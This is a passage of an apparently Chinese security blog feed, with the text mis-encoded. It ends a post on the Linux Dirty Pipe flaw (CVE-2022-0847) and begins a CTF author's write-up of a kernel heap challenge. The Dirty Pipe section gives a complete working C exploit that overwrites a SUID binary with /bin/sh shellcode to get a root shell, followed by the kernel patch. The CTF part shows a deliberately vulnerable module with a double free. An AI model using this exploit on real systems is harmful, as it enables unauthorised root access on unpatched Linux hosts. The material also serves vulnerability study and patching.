failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; data_size)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œï¼Œå‘ç°æˆ‘ä»¬æˆåŠŸåœ°è¦†å†™äº†åªè¯»æ–‡ä»¶</p><p><img src="https://s2.loli.net/2022/03/12/vOGZw2Qt9VRsYDd.png" alt="image.png"></p><h1 id="0x03-ææƒ"><a href="#0x03-ææƒ" class="headerlink" title="0x03.ææƒ"></a>0x03.ææƒ</h1><p>æ¼æ´çš„åˆ©ç”¨å½¢å¼ä¸â€œè„ç‰›â€åŸºæœ¬ä¸Šæ˜¯ä¸€æ ·çš„ï¼šè¦†å†™ <code>/etc/passwd</code> æˆ–è€…è¦†å†™ä¸€äº› suid ç¨‹åºè¿›è¡Œææƒï¼Œè¿™é‡Œå°±ä¸è¿‡å¤šèµ˜å™äº†</p><h2 id="suid-ææƒ"><a href="#suid-ææƒ" class="headerlink" title="suid ææƒ"></a>suid ææƒ</h2><p>ç¬”è€…ç°ç»™å‡ºä¸€ä¸ªä¿®æ”¹æŒ‡å®š suid ç¨‹åºè¿›è¡Œææƒçš„ expï¼Œä½¿ç”¨ msfvenom ç”Ÿæˆè¿è¡Œ <code>/bin/sh</code> çš„ shellcodeï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * exploit of CVE-2022-0847</span></span><br><span class="line"><span class="comment"> * written by arttnba3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = &#123;</span><br><span class="line">    <span class="number">0x7f</span>, <span class="number">0x45</span>, <span class="number">0x4c</span>, <span class="number">0x46</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x3e</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x78</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x38</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>,</span><br><span class="line">    <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x99</span>, <span class="number">0x50</span>, <span class="number">0x54</span>, <span class="number">0x5f</span>, <span class="number">0x52</span>, <span class="number">0x5e</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x0f</span>, <span class="number">0x05</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> shellcode_len = <span class="number">149</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">long</span>page_size;</span><br><span class="line"><span class="type">size_t</span>offset_in_file;</span><br><span class="line"><span class="type">size_t</span> data_size;</span><br><span class="line"><span class="type">int</span> target_file_fd;</span><br><span class="line"><span class="type">int</span>pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="type">int</span> pipe_size;</span><br><span class="line"><span class="type">char</span> *buffer;</span><br><span class="line"><span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line"><span class="comment">// checking before we start to exploit</span></span><br><span class="line"><span class="keyword">if</span> (argc &lt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Usage: ./exp target_file&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">offset_in_file = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">target_file_fd = open(argv[<span class="number">1</span>], O_RDONLY);</span><br><span class="line"><span class="keyword">if</span> (target_file_fd &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Failed to open the target file!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit now...</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Start exploiting...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * prepare the pipe, make every pipe_buffer a MERGE flag</span></span><br><span class="line"><span class="comment"> * Just write and read through</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Setting the PIPE_BUF_FLAG_CAN_MERGE for each buffer in pipe.\033[0m&quot;</span>);</span><br><span class="line">pipe(pipe_fd);</span><br><span class="line">pipe_size = fcntl(pipe_fd[<span class="number">1</span>], F_GETPIPE_SZ);</span><br><span class="line">buffer = (<span class="type">char</span>*) <span class="built_in">malloc</span>(page_size);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_write = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= write(pipe_fd[<span class="number">1</span>], buffer, per_write);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> size_left = pipe_size; size_left &gt; <span class="number">0</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> per_read = size_left &gt; page_size ? page_size : size_left;</span><br><span class="line">size_left -= read(pipe_fd[<span class="number">0</span>], buffer, per_read);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Flag setting has been done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Use the splice to make the pipe_buffer-&gt;page</span></span><br><span class="line"><span class="comment"> * become the page of the file mapped, by read</span></span><br><span class="line"><span class="comment"> * a byte from the file accross the splice</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Reading a byte from the file by splice.\033[0m&quot;</span>);</span><br><span class="line">offset_in_file--;<span class="comment">// we read a byte, so offset should minus 1</span></span><br><span class="line">retval = splice(target_file_fd, &amp;offset_in_file, pipe_fd[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;splice failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval == <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;short splice!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] File splice done.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Now it comes to the time of exploit:</span></span><br><span class="line"><span class="comment"> * the mapped page of file has been in pipe_buffer,</span></span><br><span class="line"><span class="comment"> * and the PIPE_BUF_FLAG_CAN_MERGE is still set,</span></span><br><span class="line"><span class="comment"> * just a simple write can make the exploit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">retval = write(pipe_fd[<span class="number">1</span>], &amp;shellcode[<span class="number">1</span>], shellcode_len);</span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">errExit(<span class="string">&quot;Write failed!&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (retval &lt; shellcode_len)</span><br><span class="line">errExit(<span class="string">&quot;Short write!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] EXPLOIT DONE!\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Trigger root shell...\033[0m&quot;</span>);</span><br><span class="line">system(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ Ubuntu 21.10 ã€å†…æ ¸ç‰ˆæœ¬ <code>5.13.0-28</code>  ä¸Šæµ‹è¯•çš„ç»“æœå¦‚ä¸‹ï¼ŒæˆåŠŸå®Œæˆææƒï¼š</p><p><img src="https://s2.loli.net/2022/03/12/P2QdeIqbASfuxHR.png" alt="image.png"></p><h1 id="0x04-æ¼æ´ä¿®å¤"><a href="#0x04-æ¼æ´ä¿®å¤" class="headerlink" title="0x04.æ¼æ´ä¿®å¤"></a>0x04.æ¼æ´ä¿®å¤</h1><p>æ¼æ´çš„ä¿®å¤æ–¹å¼æ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦åœ¨å¯¹åº”çš„æ¶‰åŠåˆ° <code>pipe_buffer-&gt;flags</code> çš„ä»£ç æ·»åŠ ä¸Šå°† flag ç½® 0 çš„ä»£ç å³å¯ï¼Œé™¤äº† <code>copy_page_to_iter_pipe</code> ä»¥å¤–åœ¨ <code>push_pipe</code> ä¸­ä¹Ÿç¼ºå¤±äº†ç½® 0 çš„ä»£ç ï¼Œè¡¥å……ä¸Šå³å¯ï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/lib/iov_iter.c b/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">index b0e0acdf96c1..6dd5330f7a99 100644</span></span><br><span class="line"><span class="comment">--- a/lib/iov_iter.c</span></span><br><span class="line"><span class="comment">+++ b/lib/iov_iter.c</span></span><br><span class="line"><span class="meta">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by</span><br><span class="line"> return 0;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> get_page(page);</span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = offset;</span><br><span class="line"><span class="meta">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,</span><br><span class="line"> break;</span><br><span class="line"> </span><br><span class="line"> buf-&gt;ops = &amp;default_pipe_buf_ops;</span><br><span class="line"><span class="addition">+buf-&gt;flags = 0;</span></span><br><span class="line"> buf-&gt;page = page;</span><br><span class="line"> buf-&gt;offset = 0;</span><br><span class="line"> buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);</span><br></pre></td></tr></table></figure><blockquote><p>å‚è§<a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">linux-kernel.vger.kernel.org archive mirror</a></p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘è¶…ï¼Œç®¡äººç—´ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="ææƒ" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x06ã€‘D^ 3CTF2022 d3kheap å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/"/>
    <id>http://blog.arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/</id>
    <published>2022-03-08T10:25:07.000Z</published>
    <updated>2022-05-16T21:46:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>å¬è¯´ sb å‡ºé¢˜äººæŠŠ exp ä¹Ÿç»™æ‰“åŒ…å‘å¸ƒäº†ï¼Œæ¯”èµ›ç»“æŸæ‰å‘ç°</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬é¢˜çš„åŸå‹æ¥è‡ªäºç¬”è€…å¤§ä¸‰ä¸Šå­¦æœŸé¢è¯•å›½å†…æŸå®‰å…¨å¤§å‚æ—¶çš„ä¸€é“é¢è¯•é¢˜ï¼Œå½“æ—¶çš„é—®é¢˜æ˜¯ï¼š</p><ul><li>â€œåœ¨ä¿æŠ¤å…¨å¼€çš„æƒ…å†µä¸‹è‹¥æ˜¯ç»™ä½ ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸­çš„ double freeï¼Œå¤§å°ä¸ºâ–ˆâ–ˆâ–ˆï¼Œä½ è¯¥æ€æ ·å»åˆ©ç”¨ï¼Ÿâ€</li></ul><p>ç¬”è€…åœ¨å½“æ—¶å¹¶æœªç­”å‡ºä¸€ä¸ªä»¤é¢è¯•å®˜è¾ƒä¸ºæ»¡æ„çš„ç­”æ¡ˆï¼Œä¹‹åç¬”è€…é‡æ–°æ€è€ƒï¼Œå‘ç°è¿™æ˜¯ä¸€ä¸ª<strong>ååˆ†æœ‰æ„æ€</strong>çš„é—®é¢˜ï¼šè¿™ååˆ†è´´è¿‘äºç°å®å†…æ ¸æ¼æ´çš„æŠ½è±¡æ¨¡å‹ä¹‹ä¸€ã€‚</p><p>ç›¸æ¯”äº CTF ä¸­ pwn é¢˜æ‰€ç»™äºˆçš„â€œä¼˜è¶Šâ€çš„ç¯å¢ƒï¼Œç°å®ä¸­çš„æ¼æ´å¾€å¾€å°±<strong>åªæ˜¯</strong>ä¸€ä¸ªå¼•ç”¨è®¡æ•°é”™è¯¯å¯¼è‡´çš„ double freeã€ä¸€ä¸ªæº¢å‡ºï¼ˆå¯èƒ½åªæ˜¯ä¸€ä¸ª <code>\0</code> å­—èŠ‚ï¼‰ã€ä¸€ä¸ªå‚æ‚¬æŒ‡é’ˆå¯¼è‡´çš„ UAFâ€¦åœ¨è¿™ç§æ¼æ´ç¯å¢ƒå½“ä¸­ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰â€œå‡ºé¢˜äººâ€ç»™äºˆæˆ‘ä»¬çš„â€œèœå•å †â€çš„å„ç§åŠŸèƒ½</p><p>å› æ­¤ï¼Œåœ¨è¿™æ ·â€œæ¶åŠ£â€çš„æ¼æ´ç¯å¢ƒä¹‹ä¸‹ï¼Œæˆ‘ä»¬ä¸èƒ½ä»…ä»…å¯„å¸Œæœ›äºè¿™ä¸ªæ¼æ´æœ‰ä¸€ä¸ªè¾ƒå¥½çš„å“ç›¸ã€æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸åŸºå€åˆèƒ½å¸®æˆ‘ä»¬åŠ«æŒæ§åˆ¶æµï¼Œè€Œåº”å½“æ›´å¤šåœ°<strong>å€ŸåŠ©å†…æ ¸æœ¬èº«æä¾›ç»™æˆ‘ä»¬çš„å·¥å…·</strong>ï¼Œä»¥å¯»æ±‚æ›´ä¸º<strong>é€šç”¨</strong>çš„è§£æ³•</p><p>å¦‚ä½•å¯»æ±‚æ›´ä¸ºé€šç”¨çš„è§£æ³•ï¼Ÿå¤§å®¶éƒ½çŸ¥é“å¯¹äºç”¨æˆ·æ€çš„ glibc å †é¢˜è€Œè¨€æˆ‘ä»¬å¾€å¾€æœ‰ç€ä¸€ç§é€šç”¨è§£æ³•â€”â€”å°†æ¼æ´è½¬ä¸º UAFã€‚æ— è®ºæ˜¯ overlapping ã€double freeã€overflowâ€¦æœ€ç»ˆæˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡å°†å…¶è½¬åŒ–ä¸º UAF å®Œæˆåˆ©ç”¨ï¼Œè¿™ä¸ªæ³•åˆ™å¯¹äºâ€œå†…æ ¸å †â€è€Œè¨€åŒæ ·æœ‰æ•ˆ</p><p>åŸºäºè¿™ç§æ€æƒ³ï¼Œå¯¹äºå†…æ ¸ä¸­çš„ double freeã€å †æº¢å‡ºç­‰æ¼æ´ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥æƒ³æ–¹æ³•å°†å…¶åŒ–ä¸º UAFï¼Œä¹‹åå†é€šè¿‡é€šç”¨çš„è§£æ³•å®Œæˆè§£é¢˜â€”â€”<strong>æœ¬é¢˜ä¾¿æ˜¯ç¬”è€…å¯¹äºåœ¨å†…æ ¸æ¼æ´åˆ©ç”¨çš„ UAF é˜¶æ®µä¹‹åé€šç”¨çš„è§£æ³•çš„ä¸€ä¸ªæ¢ç´¢ä¸å°è¯•</strong></p><h1 id="0x01-é¢˜ç›®åˆ†æ"><a href="#0x01-é¢˜ç›®åˆ†æ" class="headerlink" title="0x01.é¢˜ç›®åˆ†æ"></a>0x01.é¢˜ç›®åˆ†æ</h1><p>ç¬”è€…åœ¨ README.md ä¸­é¢å¤–è¯´æ˜äº†å†…æ ¸çš„å¦‚ä¸‹ç¼–è¯‘é€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;</span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>å³é™¤äº† FG-KASLR ä»¥å¤–å¤§éƒ¨åˆ†ä¸»æµçš„ä¿æŠ¤éƒ½å¼€å¯äº†</p><p>å› ä¸ºç¬”è€…æ›´å¸Œæœ›å¤§å®¶èƒ½å¤Ÿå…³æ³¨äºæ¼æ´åˆ©ç”¨ä¸Šï¼Œå› æ­¤é¢˜ç›®æœ¬èº«çš„é€»è¾‘ååˆ†ç®€å•ï¼Œåªæä¾›äº†ä¸€ä¸ª ioctl â€œèœå•â€ï¼Œ<strong>æœ‰æ•ˆçš„åŠŸèƒ½åªæœ‰åˆ†é…ä¸é‡Šæ”¾ buf</strong>ï¼Œåˆ†é…çš„å¤§å°ä¸º 1024</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">d3kheap_ioctl</span><span class="params">(<span class="keyword">struct</span> file *__file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> param)</span></span><br><span class="line">&#123;</span><br><span class="line">    spin_lock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (cmd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> OBJ_ADD:</span><br><span class="line">                <span class="keyword">if</span> (buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You already had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                buf = kmalloc(<span class="number">1024</span>, GFP_KERNEL);</span><br><span class="line">                ref_count++;</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Alloc done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_EDIT:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_SHOW:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Function not completed yet, because I\&#x27;m a pigeon!&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OBJ_DEL:</span><br><span class="line">                <span class="keyword">if</span> (!buf)</span><br><span class="line">                &#123;</span><br><span class="line">                    printk(KERN_ALERT <span class="string">&quot;[d3kheap:] You don\&#x27;t had a buffer!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!ref_count)</span><br><span class="line">                &#123;</span><br><span class="line">                    